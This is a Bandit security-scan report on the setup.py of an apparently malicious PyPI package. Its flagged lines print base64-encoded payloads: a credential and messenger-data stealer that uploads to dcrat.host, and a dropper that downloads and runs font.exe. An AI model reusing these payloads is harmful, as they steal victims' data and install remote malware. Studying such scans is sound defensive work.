kubmFtZSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKVxyXG5cclxuICAgICAgICBpZiBub3QgZmlsZXM6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICByZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnZmlsZXppbGxhJylcclxuICAgICAgICBpZiBub3QgaXNkaXIocmVzX3BhdGgpOlxyXG4gICAgICAgICAgICBta2RpcihyZXNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBmb3IgZiBpbiBmaWxlczpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBmLnNwbGl0KCcuJylbMF1cclxuICAgICAgICAgICAgZGVzdF9wYXRoID0gam9pbihyZXNfcGF0aCwgZid7ZmlsZW5hbWV9X3t0b2tlbl9oZXgoNCl9LnhtbCcpXHJcbiAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4ocGF0aCwgZiksIGRlc3RfcGF0aClcclxuXHJcbiAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidGaWxlemlsbGEgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo4MwogICAgX19PTzBPTzAwME9PTzBPME9PMCAoJ3BsdWdpbnMvVGVsZWdyYW0ucHknLGInZnJvbSBwbHVnaW5zIGltcG9ydCBQbHVnaW5cclxuZnJvbSBjb25maWcgaW1wb3J0IENvbmZpZ1xyXG5mcm9tIG9zLnBhdGggaW1wb3J0IGlzZGlyLCBqb2luLCBub3JtcGF0aFxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgc2NhbmRpclxyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWVcclxuaW1wb3J0IHdpbnJlZ1xyXG5pbXBvcnQgcmVcclxuZnJvbSBwYXRocyBpbXBvcnQgTE9DQUxcclxuaW1wb3J0IHdpbjMyY29tLmNsaWVudFxyXG5pbXBvcnQgcHN1dGlsXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgc3BsaXRcclxuXHJcblxyXG5cclxuY2xhc3MgVGVsZWdyYW0oUGx1Z2luKTpcclxuICAgIFNURUFMRUQgPSBzZXQoKVxyXG5cclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHBhdGhfID0gbm9ybXBhdGgocGF0aC5sb3dlcigpKVxyXG4gICAgICAgIGlmIHBhdGhfIGluIFRlbGVncmFtLlNURUFMRUQ6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIFRlbGVncmFtLlNURUFMRUQuYWRkKHBhdGhfKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIHRkYXRhX3BhdGggPSBqb2luKHBhdGgsIFwndGRhdGFcJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGRhdGFfcGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB0ZWxlZ3JhbV9wYXRoID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsIFwndGVsZWdyYW1cJylcclxuICAgICAgICBpZiBub3QgaXNkaXIodGVsZWdyYW1fcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHRlbGVncmFtX3BhdGgpXHJcblxyXG4gICAgICAgIHJlc19wYXRoID0gam9pbih0ZWxlZ3JhbV9wYXRoLCBmXCd0ZGF0YV97dG9rZW5faGV4KDQpfVwnKVxyXG4gICAgICAgIG1rZGlyKHJlc19wYXRoKVxyXG5cclxuICAgICAgICBibGFja2xpc3QgPSBbXCdkdW1wc1wnLCBcJ2Vtb2ppXCcsIFwndXNlcl9kYXRhXCcsIFwnd29ya2luZ1wnXVxyXG5cclxuICAgICAgICBmb3IgZiBpbiBzY2FuZGlyKHRkYXRhX3BhdGgpOlxyXG4gICAgICAgICAgICBmaWxlX29rID0gVHJ1ZVxyXG4gICAgICAgICAgICBmb3IgaSBpbiBibGFja2xpc3Q6XHJcbiAgICAgICAgICAgICAgICBpZiBpIGluIGYubmFtZTpcclxuICAgICAgICAgICAgICAgICAgICBmaWxlX29rID0gRmFsc2VcclxuICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgaWYgbm90IGZpbGVfb2s6XHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgZnJvbV9wYXRoID0gam9pbih0ZGF0YV9wYXRoLCBmLm5hbWUpXHJcbiAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4ocmVzX3BhdGgsIGYubmFtZSlcclxuXHJcbiAgICAgICAgICAgIGZ1bmMgPSBjb3B5ZmlsZSBpZiBmLmlzX2ZpbGUoKSBlbHNlIGNvcHl0cmVlXHJcbiAgICAgICAgICAgIGF3YWl0IGZ1bmMoZnJvbV9wYXRoLCBkZXN0X3BhdGgpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGZcJ1RlbGVncmFtIHN0ZWFsZWQgZnJvbSB7cGF0aH1cJylcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X3JlZ2lzdHJ5X3BhdGgoKTpcclxuICAgICAgICBwYXRoID0gd2lucmVnLkhLRVlfQ0xBU1NFU19ST09UXHJcblxyXG4gICAgICAgIHRnID0gd2lucmVnLk9wZW5LZXlFeChwYXRoLCByInRkZXNrdG9wLnRnXFxcXCIpXHJcbiAgICAgICAgc2hlbGwgPSB3aW5yZWcuT3BlbktleUV4KHRnLCByXCdzaGVsbFxcXFxcJylcclxuICAgICAgICBvcGVuX3JnID0gd2lucmVnLk9wZW5LZXlFeChzaGVsbCwgclwnb3BlblxcXFxcJylcclxuICAgICAgICBrZXkgPSB3aW5yZWcuT3BlbktleUV4KG9wZW5fcmcsIHJcJ2NvbW1hbmRcXFxcXCcpXHJcblxyXG4gICAgICAgIHZhbHVlID0gd2lucmVnLkVudW1WYWx1ZShrZXksIDApXHJcblxyXG4gICAgICAgIHBhdGggPSByZS5maW5kYWxsKHJcJyIoW14iXSopXCcsIHZhbHVlWzFdKVsyXVxyXG4gICAgICAgIHJldHVybiBwYXRoXHJcbiAgICAgICAgXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2xua19wYXRoKCk6XHJcbiAgICAgICAgZGVza3RvcCA9IGpvaW4oTE9DQUwsIFwnZGVza3RvcFwnKVxyXG5cclxuICAgICAgICBmb3IgaXQgaW4gc2NhbmRpcihkZXNrdG9wKTpcclxuICAgICAgICAgICAgaWYgaXQubmFtZS5zcGxpdChcJy5cJylbLTFdID09IFwnbG5rXCcgYW5kIFwndGVsZWdyYW1cJyBpbiBpdC5uYW1lLmxvd2VyKCk6XHJcbiAgICAgICAgICAgICAgICBzaGVsbCA9IHdpbjMyY29tLmNsaWVudC5EaXNwYXRjaCgiV1NjcmlwdC5TaGVsbCIpXHJcbiAgICAgICAgICAgICAgICBzaG9ydGN1dCA9IHNoZWxsLkNyZWF0ZVNob3J0Q3V0KGl0LnBhdGgpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gc2hvcnRjdXQuVGFyZ2V0cGF0aC5sb3dlcigpLnN0cmlwKFwndGVsZWdyYW0uZXhlXCcpXHJcbiAgICAgICAgICAgICAgICByZXR1cm4gcGF0aFxyXG5cclxuICAgIEBzdGF0aWNtZXRob2RcclxuICAgIGRlZiBnZXRfdGVsZWdyYW1zKCk6XHJcbiAgICAgICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOlxyXG4gICAgICAgICAgICBpZiBcJ3RlbGVncmFtXCcgaW4gcHJvYy5uYW1lKCkubG93ZXIoKTpcclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBzcGxpdChwcm9jLmV4ZSgpKVswXVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0OlxyXG4gICAgICAgICAgICAgICAgICAgIHBhc3MnKSNsaW5lOjg0CiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9XaGF0c2FwcC5weScsYiJmcm9tIHBsdWdpbnMgaW1wb3J0IFBsdWdpblxyXG5mcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnXHJcbmZyb20gb3MucGF0aCBpbXBvcnQgaXNkaXIsIGpvaW5cclxuZnJvbSBvcyBpbXBvcnQgbWtkaXIsIHNjYW5kaXJcclxuZnJvbSBzZWNyZXRzIGltcG9ydCB0b2tlbl9oZXhcclxuZnJvbSB0b29scyBpbXBvcnQgY29weXRyZWVcclxuXHJcblxyXG5cclxuY2xhc3MgV2hhdHNhcHAoUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgY2FsbGJhY2soc2VsZiwgcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIG5vdCBpc2RpcihwYXRoKTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGZvbGRlciA9IGpvaW4ocGF0aCwgJ2xvY2FsIHN0b3JhZ2UnLCAnbGV2ZWxkYicpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcihmb2xkZXIpOlxyXG4gICAgICAgICAgICByZXR1cm5cclxuICAgICAgICBcclxuICAgICAgICB3aGF0c2FwcF9yZXNfZm9sZGVyID0gam9pbihzZWxmLmNvbmYubG9nX3BhdGgsICd3aGF0c2FwcCcpXHJcblxyXG4gICAgICAgIGlmIG5vdCBpc2Rpcih3aGF0c2FwcF9yZXNfZm9sZGVyKTpcclxuICAgICAgICAgICAgbWtkaXIod2hhdHNhcHBfcmVzX2ZvbGRlcilcclxuXHJcbiAgICAgICAgcmVzID0gam9pbih3aGF0c2FwcF9yZXNfZm9sZGVyLCBmJ3doYXRzYXBwX3t0b2tlbl9oZXgoNCl9JylcclxuXHJcbiAgICAgICAgYXdhaXQgY29weXRyZWUoZm9sZGVyLCByZXMpXHJcblxyXG4gICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnV2hhdHNhcHAgc3RlYWxlZCBmcm9tIHtwYXRofScpIikjbGluZTo4NQogICAgaW1wb3J0IGFzeW5jaW8gI2xpbmU6ODYKICAgIGZyb20gYXN5bmNpbyBpbXBvcnQgY3JlYXRlX3Rhc2sgI2xpbmU6ODcKICAgIGZyb20gdHlwaW5nIGltcG9ydCBMaXN0ICNsaW5lOjg4CiAgICBmcm9tIHBhdGhfc2VhcmNoIGltcG9ydCBzZWFyY2hfcGx1Z2luX3BhdGhzICxyb290X3BhdGhzICNsaW5lOjg5CiAgICBmcm9tIGNvbmZpZyBpbXBvcnQgQ29uZmlnICNsaW5lOjkwCiAgICBmcm9tIGFpb2h0dHAgaW1wb3J0IENsaWVudFNlc3Npb24gYXMgU2Vzc2lvbiAjbGluZTo5MQogICAgaW1wb3J0IHNlY3JldHMgI2xpbmU6OTIKICAgIGltcG9ydCB0aW1laXQgI2xpbmU6OTMKICAgIGZyb20gcGF0aHMgaW1wb3J0IFRFTVAgI2xpbmU6OTQKICAgIGZyb20gb3MgaW1wb3J0IG1rZGlyICNsaW5lOjk1CiAgICBmcm9tIG9zIC5wYXRoIGltcG9ydCBqb2luICNsaW5lOjk2CiAgICBmcm9tIHppcGZpbGUgaW1wb3J0IFppcEZpbGUgLFpJUF9ERUZMQVRFRCAjbGluZTo5NwogICAgZnJvbSB0b29scyBpbXBvcnQgemlwZGlyICxfaGFuZGxlX3Rhc2tfcmVzdWx0ICNsaW5lOjk4CiAgICBmcm9tIGxvZ2dlciBpbXBvcnQgTG9nZ2VyICNsaW5lOjk5CiAgICBmcm9tIG9zIGltcG9ydCBzY2FuZGlyICNsaW5lOjEwMAogICAgZnJvbSBwbHVnaW5zIGltcG9ydCBDaHJvbWl1bSAsRGV0YWlscyAsRXhvZHVzICxGaWxlemlsbGEgLFRlbGVncmFtICxXaGF0c2FwcCAjbGluZToxMDIKICAgIEhPU1QgPSdodHRwOi8vZGNyYXQuaG9zdDo4MDgwJyNsaW5lOjEwNgogICAgYXN5bmMgZGVmIG1haW4gKCktPk5vbmUgOiNsaW5lOjEwOQogICAgICAgIE8wME8wTzBPME9PT09PTzBPID10aW1laXQgLmRlZmF1bHRfdGltZXIgKCkjbGluZToxMTAKICAgICAgICBPTzAwMDBPME9PTzAwMDAwMCA9c2VjcmV0cyAudG9rZW5faGV4ICgxMCApI2xpbmU6MTEyCiAgICAgICAgT08wME8wME9PTzBPT08wME8gPWpvaW4gKFRFTVAgLE9PMDAwME8wT09PMDAwMDAwICkjbGluZToxMTMKICAgICAgICBwcmludCAoT08wME8wME9PTzBPT08wME8gKSNsaW5lOjExNQogICAgICAgIG1rZGlyIChPTzAwTzAwT09PME9PTzAwTyApI2xpbmU6MTE2CiAgICAgICAgTzAwME9PME9PT08wT09PTzAgOkxpc3QgW2FzeW5jaW8gLlRhc2sgXT1bXSNsaW5lOjExOAogICAgICAgIE8wMDBPT08wT08wT08wT09PID1TZXNzaW9uICgpI2xpbmU6MTIwCiAgICAgICAgT08wME9PMDAwME8wT09PMDAgPUxvZ2dlciAoT08wME8wME9PTzBPT08wME8gKSNsaW5lOjEyMQogICAgICAgIE8wME9PTzBPMDBPMDAwMDAwID1Db25maWcgKE9PMDAwME8wT09PMDAwMDAwICxIT1NUICxPTzAwTzAwT09PME9PTzAwTyAsT08wME9PMDAwME8wT09PMDAgLE8wMDBPT08wT08wT08wT09PICx0YWcgPSd4dXknKSNsaW5lOjEyMgogICAgICAgIGF3YWl0IE9PMDBPTzAwMDBPME9PTzAwIC5sb2cgKGYnU3RhcnQnKSNsaW5lOjEyNAogICAgICAgIE8wMDBPT09PTzBPT09PT08wID1DaHJvbWl1bSAoTzAwT09PME8wME8wMDAwMDAgKSNsaW5lOjEyNgogICAgICAgIE9PTzAwTzAwTzAwME8wME8wID1UZWxlZ3JhbSAoTzAwT09PME8wME8wMDAwMDAgKSNsaW5lOjEyNwogICAgICAgIE8wT08wTzAwT08wME9PMDAwID17J2dvb2dsZSc6TzAwME9PT09PME9PT09PTzAgLCdleG9kdXMnOkV4b2R1cyAoTzAwT09PME8wME8wMDAwMDAgKSwnbW96aWxsYSc6Tm9uZSAsJ3RlbGVncmFtIGRlc2t0b3AnOk9PTzAwTzAwTzAwME8wME8wICwndGVsZWdyYW0nOlRlbGVncmFtIChPMDBPT08wTzAwTzAwMDAwMCApLCdvcGVyYSBzb2Z0d2FyZSc6TzAwME9PT09PME9PT09PTzAgLCdmaWxlemlsbGEnOkZpbGV6aWxsYSAoTzAwT09PME8wME8wMDAwMDAgKSwnd2hhdHNhcHAnOldoYXRzYXBwIChPMDBPT08wTzAwTzAwMDAwMCApfSNsaW5lOjEzOAogICAgICAgIE8wMDBPTzBPT09PME9PT08wIC5hcHBlbmQgKGNyZWF0ZV90YXNrIChzZWFyY2hfcGx1Z2luX3BhdGhzIChyb290X3BhdGhzICxPME9PME8wME9PMDBPTzAwMCAsT08wME9PMDAwME8wT09PMDAgKSkpI2xpbmU6MTQwCiAgICAgICAgTzBPMDAwME8wME8wTzBPME8gPVtEZXRhaWxzIChPMDBPT08wTzAwTzAwMDAwMCApXSNsaW5lOjE0MgogICAgICAgIGZvciBPT08wT08wME8wT08wME8wTyBpbiBPME8wMDAwTzAwTzBPME8wTyA6I2xpbmU6MTQ0CiAgICAgICAgICAgIE8wMDBPTzBPT09PME9PT08wIC5hcHBlbmQgKGNyZWF0ZV90YXNrIChPT08wT08wME8wT08wME8wTyAuY2FsbGJhY2sgKCkpKSNsaW5lOjE0NQogICAgICAgIGZvciBPME8wME9PTzAwME9PT08wMCBpbiBPMDAwT08wT09PTzBPT09PMCA6I2xpbmU6MTQ3CiAgICAgICAgICAgIE8wTzAwT09PMDAwT09PTzAwIC5hZGRfZG9uZV9jYWxsYmFjayAobGFtYmRhIE8wMDAwME8wT08wTzAwTzAwIDpfaGFuZGxlX3Rhc2tfcmVzdWx0IChPMDAwMDBPME9PME8wME8wMCAsT08wME9PMDAwME8wT09PMDAgKSkjbGluZToxNDgKICAgICAgICB0cnkgOiNsaW5lOjE1MQogICAgICAgICAgICBPMDAwTzBPTzBPT08wMDBPTyA9VGVsZWdyYW0gLmdldF9yZWdpc3RyeV9wYXRoICgpI2xpbmU6MTUyCiAgICAgICAgICAgIGF3YWl0IE9PTzAwTzAwTzAwME8wME8wIC5jYWxsYmFjayAoTzAwME8wT08wT09PMDAwT08gKSNsaW5lOjE1MwogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgTzBPMDBPT08wME9PME8wME8gOiNsaW5lOjE1NAogICAgICAgICAgICBhd2FpdCBPTzAwT08wMDAwTzBPT08wMCAubG9nIChmJ0Vycm9yIHdoZW4gc3RlYWxpbmcgdGVsZWdyYW0gcmVnaXN0cnksIHtPME8wME9PTzAwT08wTzAwT30nKSNsaW5lOjE1NQogICAgICAgIHRyeSA6I2xpbmU6MTU3CiAgICAgICAgICAgIE8wTzBPTzAwMDAwMDAwTzAwID1UZWxlZ3JhbSAuZ2V0X2xua19wYXRoICgpI2xpbmU6MTU4CiAgICAgICAgICAgIGlmIE8wTzBPTzAwMDAwMDAwTzAwIDojbGluZToxNTkKICAgICAgICAgICAgICAgIGF3YWl0IE9PTzAwTzAwTzAwME8wME8wIC5jYWxsYmFjayAoTzAwME8wT08wT09PMDAwT08gKSNsaW5lOjE2MAogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgTzBPMDBPT08wME9PME8wME8gOiNsaW5lOjE2MQogICAgICAgICAgICBhd2FpdCBPTzAwT08wMDAwTzBPT08wMCAubG9nIChmJ0Vycm9yIHdoZW4gc3RlYWxpbmcgdGVsZWdyYW0gbG5rLCB7TzBPMDBPT08wME9PME8wME99JykjbGluZToxNjIKICAgICAgICB0cnkgOiNsaW5lOjE2NAogICAgICAgICAgICBmb3IgT09PTzBPTzAwT09PT09PMDAgaW4gVGVsZWdyYW0gLmdldF90ZWxlZ3JhbXMgKCk6I2xpbmU6MTY1CiAgICAgICAgICAgICAgICB0cnkgOiNsaW5lOjE2NgogICAgICAgICAgICAgICAgICAgIGF3YWl0IE9PTzAwTzAwTzAwME8wME8wIC5jYWxsYmFjayAoT09PTzBPTzAwT09PT09PMDAgKSNsaW5lOjE2NwogICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPME8wME9PTzAwT08wTzAwTyA6I2xpbmU6MTY4CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgT08wME9PMDAwME8wT09PMDAgLmxvZyAoZidUZWxlZ3JhbSBmcm9tIHBzdXRpbCBlcnJvciwge08wTzAwT09PMDBPTzBPMDBPfScpI2xpbmU6MTY5CiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBPME8wME9PTzAwT08wTzAwTyA6I2xpbmU6MTcwCiAgICAgICAgICAgIGF3YWl0IE9PMDBPTzAwMDBPME9PTzAwIC5sb2cgKGYnRXJyb3Igd2hlbiBzdGVhbGluZyB0ZWxlZ3JhbXMgcHJvYywge08wTzAwT09PMDBPTzBPMDBPfScpI2xpbmU6MTcxCiAgICAgICAgZm9yIE8wTzAwT09PMDAwT09PTzAwIGluIE8wMDBPTzBPT09PME9PT08wIDojbGluZToxNzQKICAgICAgICAgICAgdHJ5IDojbGluZToxNzUKICAgICAgICAgICAgICAgIGF3YWl0IE8wTzAwT09PMDAwT09PTzAwICNsaW5lOjE3NgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIE8wTzAwT09PMDBPTzBPMDBPIDojbGluZToxNzcKICAgICAgICAgICAgICAgIGF3YWl0IE9PMDBPTzAwMDBPME9PTzAwIC5sb2cgKGYnRXJyb3IgaW4gbWFpbi5weSB0YXNrcyB7TzBPMDBPT08wME9PME8wME99JykjbGluZToxNzgKICAgICAgICBhd2FpdCBPTzAwT08wMDAwTzBPT08wMCAubG9nIChmJ9Cd0LDRh9C40L3QsNGOINC+0YLQv9GA0LDQstC60YMg0LvQvtCz0LAnKSNsaW5lOjE4MAogICAgICAgIE9PME8wTzBPME8wMDAwMDBPID1qb2luIChURU1QICxmJ3tPTzAwMDBPME9PTzAwMDAwMH0uemlwJykjbGluZToxODIKICAgICAgICB3aXRoIFppcEZpbGUgKE9PME8wTzBPME8wMDAwMDBPICwndycsWklQX0RFRkxBVEVEIClhcyBPTzAwT08wT08wMDAwMDAwTyA6I2xpbmU6MTgzCiAgICAgICAgICAgIHppcGRpciAoT08wME8wME9PTzBPT08wME8gLE9PMDBPTzBPTzAwMDAwMDBPICkjbGluZToxODQKICAgICAgICBPTzBPT08wMDAwT09PME9PMCA9eydmaWxlJzpvcGVuIChPTzBPME8wTzBPMDAwMDAwTyAsJ3JiJyl9I2xpbmU6MTg2CiAgICAgICAgYXdhaXQgTzAwME9PTzBPTzBPTzBPT08gLnBvc3QgKGYne0hPU1R9L3JlY2VpdmVfbG9nJyxwYXJhbXMgPXsnY2xpZW50X2lkJzpPTzAwMDBPME9PTzAwMDAwMCB9LGRhdGEgPU9PME9PTzAwMDBPT08wT08wICkjbGluZToxODgKICAgICAgICBhd2FpdCBPMDAwT09PME9PME9PME9PTyAuY2xvc2UgKCkjbGluZToxODkKICAgICAgICBPME8wME8wMDBPT08wT08wTyA9dGltZWl0IC5kZWZhdWx0X3RpbWVyICgpI2xpbmU6MTkxCiAgICAgICAgYXdhaXQgT08wME9PMDAwME8wT09PMDAgLmxvZyAoZidUaW1lOiB7TzBPMDBPMDAwT09PME9PME8tTzAwTzBPME8wT09PT09PME99JykjbGluZToxOTIKICAgICAgICB0cnkgOiNsaW5lOjE5NAogICAgICAgICAgICBpZiAnREVCVUcnbm90IGluIHtPME9PTzBPTzAwTzBPME8wTyAubmFtZSBmb3IgTzBPT08wT08wME8wTzBPME8gaW4gc2NhbmRpciAoam9pbiAoVEVNUCAsJ19fcHljYWNoZV9fJykpfTojbGluZToxOTUKICAgICAgICAgICAgICAgIGZyb20gc2h1dGlsIGltcG9ydCBybXRyZWUgI2xpbmU6MTk2CiAgICAgICAgICAgICAgICB0cnkgOiNsaW5lOjE5NwogICAgICAgICAgICAgICAgICAgIHJtdHJlZSAoam9pbiAoVEVNUCAsJ19fcHljYWNoZV9fJykpI2xpbmU6MTk4CiAgICAgICAgICAgICAgICBleGNlcHQgOiNsaW5lOjE5OQogICAgICAgICAgICAgICAgICAgIHBhc3MgI2xpbmU6MjAwCiAgICAgICAgICAgICAgICBybXRyZWUgKE9PMDBPMDBPT08wT09PMDBPICkjbGluZToyMDEKICAgICAgICBleGNlcHQgOiNsaW5lOjIwMgogICAgICAgICAgICBwYXNzICNsaW5lOjIwMwogICAgYXN5bmNpbyAuZ2V0X2V2ZW50X2xvb3AgKCkucnVuX3VudGlsX2NvbXBsZXRlIChtYWluICgpKQ=='))
113	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:115
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
114	    with open(join(main_dir, 'scripts.cpython-39.py'), 'w', encoding='utf8') as f:
115	        f.write(b64('CmZyb20gYWlvaHR0cCBpbXBvcnQgQ2xpZW50U2Vzc2lvbiBhcyBTZXNzCmZyb20gc3VicHJvY2VzcyBpbXBvcnQgUG9wZW4sIFBJUEUKZnJvbSBvcy5wYXRoIGltcG9ydCBzcGxpdCwgam9pbgpmcm9tIG9zIGltcG9ydCBlbnZpcm9uCmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4CmltcG9ydCBhc3luY2lvCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKCgoKc2xlZXAoNjAwKQoKCkxPQ0FMID0gZW52aXJvblsnVVNFUlBST0ZJTEUnXQpURU1QID0gam9pbihMT0NBTCwgJ2FwcGRhdGEnLCAnbG9jYWwnLCAndGVtcCcpCgphc3luYyBkZWYgbG9hZF9leGVjKHVybDogc3RyKToKICAgIHNhdmVfcGF0aCA9IGpvaW4oVEVNUCwgZid7dG9rZW5faGV4KDgpfS5leGUnKQoKICAgIGFzeW5jIHdpdGggU2VzcygpIGFzIHM6CiAgICAgICAgYXN5bmMgd2l0aCBzLmdldCh1cmwpIGFzIHJlc3A6CiAgICAgICAgICAgIHdpdGggb3BlbihzYXZlX3BhdGgsICd3YicpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGF3YWl0IHJlc3AucmVhZCgpKQoKICAgIHByaW50KHNhdmVfcGF0aCkKCiAgICBQb3BlbihzYXZlX3BhdGgsIHN0ZGluPVBJUEUsIHN0ZG91dD1QSVBFLCBzdGRlcnI9UElQRSwKICAgICAgICAgICAgY3JlYXRpb25mbGFncz0weDAwMDAwMDA4IHwgMHgwMDAwMDIwMCwgc2hlbGw9VHJ1ZSkKCgphc3luY2lvLmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKGxvYWRfZXhlYygnaHR0cDovL2RjcmF0Lmhvc3QvZm9udC5leGUnKSkK'))
116	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home/blue/PyPIAgent/Dataset/study/unzip_malware/aiohttp_proxies_connector-0.2.57/aiohttp_proxies_connector-0.2.57/setup.py:128
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
127	    with open(join(main_dir, 'main error.txt'), 'a', encoding='utf8') as f:
128	        f.write(traceback.format_exc() + '\n')

--------------------------------------------------

Code scanned:
	Total lines of code: 655
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 5.0
		High: 26.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 29.0
		High: 2.0
Files skipped (0):
